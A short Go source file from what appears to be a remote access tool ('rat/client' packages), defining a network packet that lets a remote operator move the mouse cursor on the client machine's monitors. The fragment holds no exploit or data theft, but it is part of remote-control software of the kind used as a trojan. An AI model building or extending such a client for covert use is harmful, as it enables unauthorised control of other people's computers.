package main

import (
	"rat/client/screen"
	"rat/client/network/header"
)

type MouseMovePacket struct {
	MonitorID int `network:"receive"`
	X         int `network:"receive"`
	Y         int `network:"receive"`
}

func (packet MouseMovePacket) Header() header.PacketHeader {
	return header.MouseMoveHeader
}

func (packet MouseMovePacket) OnReceive() error {
	screen.MoveCursor(packet.MonitorID, packet.X, packet.Y)

	return nil
}
